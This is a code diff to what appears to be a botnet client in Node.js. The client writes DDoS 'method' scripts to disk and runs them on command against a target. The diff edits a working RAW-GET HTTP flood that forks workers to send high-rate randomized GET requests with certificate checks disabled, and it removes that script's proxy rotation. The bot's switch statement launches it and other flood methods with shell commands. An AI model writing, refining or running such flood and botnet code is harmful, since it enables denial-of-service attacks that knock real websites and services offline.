@@ -145,7 +145,7 @@ function createMethodScripts() {
     }
   };
 
-  // Basic stub scripts (same as before)
+  // Basic stub scripts (other methods)
   const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
   writeScript('high-dstat.js', stub('high-dstat'));
   writeScript('w-flood1.js', stub('w-flood1'));
@@ -165,23 +165,21 @@ function createMethodScripts() {
   const r10files = ['r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js', 'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'];
   for (const f of r10files) writeScript(f, stub(f.replace('.js', '')));
 
-  // RAW-GET full script (the one provided by user)
+  // RAW-GET - NO PROXY VERSION (matches server)
   const rawGetContent = `#!/usr/bin/env node
 
-// RAW-GET Flood - Pure GET requests, high RPS, minimal headers
+// RAW-GET Flood - Pure GET requests, high RPS, minimal headers (NO PROXIES)
 
 const http = require('http');
 const https = require('https');
 const url = require('url');
-const fs = require('fs');
 const cluster = require('cluster');
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]) || 60,
     threads: parseInt(process.argv[4]) || 10,
-    rate: parseInt(process.argv[5]) || 1000,
-    proxyFile: process.argv[6] || 'proxy.txt'
+    rate: parseInt(process.argv[5]) || 1000
 };
 
 const parsed = new URL(args.target);
@@ -195,17 +193,8 @@ const keepAliveAgent = new httpLib.Agent({
     timeout: 60000
 });
 
-let proxies = [];
-if (fs.existsSync(args.proxyFile)) {
-    proxies = fs.readFileSync(args.proxyFile, 'utf8')
-        .split('\\n')
-        .map(l => l.trim())
-        .filter(l => l && !l.startsWith('#') && l.includes(':'));
-}
-let proxyIndex = 0;
-
 if (cluster.isMaster) {
-    console.log(\`\\n🔥 RAW-GET flood | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
+    console.log(\`\\n🔥 RAW-GET (no proxy) | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
     for (let i = 0; i < args.threads; i++) cluster.fork();
     setTimeout(() => process.exit(0), args.time * 1000 + 2000);
 } else {
@@ -214,7 +203,7 @@ if (cluster.isMaster) {
 
     function sendRequest() {
         if (!running) return;
-        let options = {
+        const options = {
             hostname: parsed.hostname,
             port: parsed.port || (isHttps ? 443 : 80),
             path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
@@ -227,12 +216,6 @@ if (cluster.isMaster) {
             agent: keepAliveAgent,
             rejectUnauthorized: false
         };
-        if (proxies.length > 0) {
-            const proxy = proxies[proxyIndex % proxies.length];
-            proxyIndex++;
-            const [proxyHost, proxyPort] = proxy.split(':');
-            options.agent = new httpLib.Agent({ host: proxyHost, port: parseInt(proxyPort), keepAlive: true });
-        }
         const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
         req.on('error', () => {});
         req.end();
@@ -438,7 +421,7 @@ async function startBot() {
       }, parseInt(time) * 1000 + 5000);
     };
 
-    // Attack methods including RAW-GET
+    // Attack methods including RAW-GET (no proxy)
     switch(methods) {
       case 'RAPID10':
         execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
@@ -469,8 +452,8 @@ async function startBot() {
         execWithLog(`node methods/http-panel.js ${target} ${time}`);
         break;
       case 'RAW-GET':
-        // threads=20, rate=800 per worker – adjust as needed
-        execWithLog(`node methods/raw-get.js ${target} ${time} 20 800 proxy.txt`);
+        // NO PROXY argument - matches server
+        execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
         break;
       case 'R9':
         execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
